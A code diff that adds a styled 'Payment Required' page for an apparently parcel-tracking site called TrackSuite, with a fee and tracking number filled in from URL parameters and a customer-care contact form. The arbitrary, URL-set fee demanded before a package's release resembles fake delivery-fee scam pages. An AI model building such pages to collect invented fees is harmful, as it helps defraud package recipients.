@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>Pay Fee — TrackSuite</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+  <script src="https://cdn.jsdelivr.net/npm/lucide@0.263.1/dist/lucide.min.js"></script>
+  <style>
+    .payment-shell {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+      position: relative;
+      z-index: 1;
+    }
+    .payment-card {
+      width: 100%;
+      max-width: 480px;
+      background: rgba(255,255,255,0.04);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-xl);
+      padding: 48px 40px;
+      backdrop-filter: blur(24px);
+      -webkit-backdrop-filter: blur(24px);
+      box-shadow: 0 24px 64px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.08);
+      text-align: center;
+      animation: fadeUp 0.6s ease-out both;
+    }
+    .payment-icon {
+      width: 64px;
+      height: 64px;
+      background: rgba(231,76,60,0.12);
+      border: 1px solid rgba(231,76,60,0.25);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+      color: #e74c3c;
+    }
+    .payment-card h1 {
+      font-size: 26px;
+      font-weight: 900;
+      letter-spacing: -0.5px;
+      margin-bottom: 10px;
+      background: linear-gradient(135deg, #ffffff 0%, #c8ddff 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .payment-card .tracking-ref {
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 32px;
+      letter-spacing: 0.5px;
+    }
+    .fee-box {
+      background: rgba(231,76,60,0.08);
+      border: 1px solid rgba(231,76,60,0.2);
+      border-radius: var(--radius);
+      padding: 28px;
+      margin-bottom: 32px;
+    }
+    .fee-label {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      color: var(--muted);
+      margin-bottom: 10px;
+    }
+    .fee-amount {
+      font-size: 48px;
+      font-weight: 900;
+      color: #e74c3c;
+      letter-spacing: -2px;
+      line-height: 1;
+    }
+    .fee-note {
+      font-size: 12px;
+      color: var(--muted);
+      margin-top: 10px;
+      line-height: 1.6;
+    }
+    .pay-now-btn {
+      display: block;
+      width: 100%;
+      padding: 17px;
+      background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
+      color: #fff;
+      border: none;
+      border-radius: var(--radius);
+      font-size: 15px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      letter-spacing: 0.4px;
+      box-shadow: 0 8px 24px rgba(231,76,60,0.35);
+      transition: var(--transition);
+      margin-bottom: 14px;
+    }
+    .pay-now-btn:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(231,76,60,0.5); }
+    .pay-now-btn:active { transform: translateY(0); }
+    .care-section {
+      margin-top: 14px;
+      border-top: 1px solid var(--border);
+      padding-top: 28px;
+      text-align: left;
+    }
+    .care-section h3 {
+      font-size: 15px;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 4px;
+    }
+    .care-section p {
+      font-size: 12px;
+      color: var(--muted);
+      margin-bottom: 18px;
+    }
+    .care-form { display: flex; flex-direction: column; gap: 12px; }
+    .care-input {
+      width: 100%;
+      background: rgba(255,255,255,0.05);
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius);
+      padding: 13px 16px;
+      font-size: 14px;
+      font-family: inherit;
+      color: var(--text);
+      outline: none;
+      transition: var(--transition);
+      resize: none;
+    }
+    .care-input::placeholder { color: rgba(160,180,220,0.4); }
+    .care-input:focus { border-color: var(--border-active); background: rgba(79,163,255,0.06); }
+    .care-submit {
+      width: 100%;
+      padding: 15px;
+      background: rgba(255,255,255,0.07);
+      color: var(--text);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      font-size: 14px;
+      font-weight: 700;
+      font-family: inherit;
+      cursor: pointer;
+      transition: var(--transition);
+    }
+    .care-submit:hover { background: rgba(255,255,255,0.12); border-color: rgba(255,255,255,0.2); }
+    .care-success {
+      display: none;
+      text-align: center;
+      padding: 20px;
+      background: rgba(52,211,153,0.08);
+      border: 1px solid rgba(52,211,153,0.2);
+      border-radius: var(--radius);
+      color: var(--success);
+      font-size: 14px;
+      font-weight: 600;
+    }
+    @media (max-width: 520px) {
+      .payment-card { padding: 36px 24px; }
+      .fee-amount { font-size: 40px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="payment-shell">
+    <div class="payment-card">
+      <div class="payment-icon">
+        <i data-lucide="alert-circle" style="width:28px;height:28px;"></i>
+      </div>
+      <h1>Payment Required</h1>
+      <p class="tracking-ref" id="trackingRef">Tracking #—</p>
+      <div class="fee-box">
+        <p class="fee-label">Fee Due</p>
+        <p class="fee-amount" id="feeAmount">—</p>
+        <p class="fee-note">This fee must be paid before your package can be released and returned to transit.</p>
+      </div>
+      <button class="pay-now-btn" onclick="alert('Payment processing is not yet configured. Please contact customer care below.')">Pay Now</button>
+
+      <div class="care-section">
+        <h3>Contact Customer Care</h3>
+        <p>Having issues? Chat with us live or send a message.</p>
+        <a href="care.html" id="liveChatLink" style="display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:13px;background:rgba(79,163,255,0.1);border:1px solid rgba(79,163,255,0.25);border-radius:var(--radius);color:var(--primary);font-size:14px;font-weight:700;text-decoration:none;margin-bottom:14px;transition:var(--transition);" onmouseover="this.style.background='rgba(79,163,255,0.18)'" onmouseout="this.style.background='rgba(79,163,255,0.1)'">💬 Start Live Chat</a>
+        <div class="care-success" id="careSuccess">✓ Message sent! We'll get back to you shortly.</div>
+        <form class="care-form" id="careForm" action="https://formspree.io/f/YOUR_FORM_ID" method="POST" onsubmit="handleCare(event)">
+          <input type="hidden" name="tracking_number" id="hiddenTracking" />
+          <input class="care-input" type="text" name="name" placeholder="Your name" required />
+          <input class="care-input" type="email" name="email" placeholder="Your email" required />
+          <textarea class="care-input" name="message" rows="4" placeholder="Describe your issue..." required></textarea>
+          <button class="care-submit" type="submit">Send Message</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const fee = params.get('fee');
+    const tracking = params.get('tracking');
+    if (fee) document.getElementById('feeAmount').textContent = fee;
+    if (tracking) {
+      document.getElementById('trackingRef').textContent = 'Tracking #' + tracking;
+      document.getElementById('hiddenTracking').value = tracking;
+      document.getElementById('liveChatLink').href = 'care.html?tracking=' + tracking;
+    }
+    document.getElementById('careForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const form = e.target;
+      const res = await fetch(form.action, {
+        method: 'POST',
+        body: new FormData(form),
+        headers: { 'Accept': 'application/json' }
+      });
+      if (res.ok) {
+        form.style.display = 'none';
+        document.getElementById('careSuccess').style.display = 'block';
+      } else {
+        alert('Failed to send message. Please try again.');
+      }
+    });
+    document.addEventListener('DOMContentLoaded', () => { if (window.lucide) lucide.replace(); });
+    window.addEventListener('load', () => { if (window.lucide) lucide.replace(); });
+  </script>
+</body>
+</html>
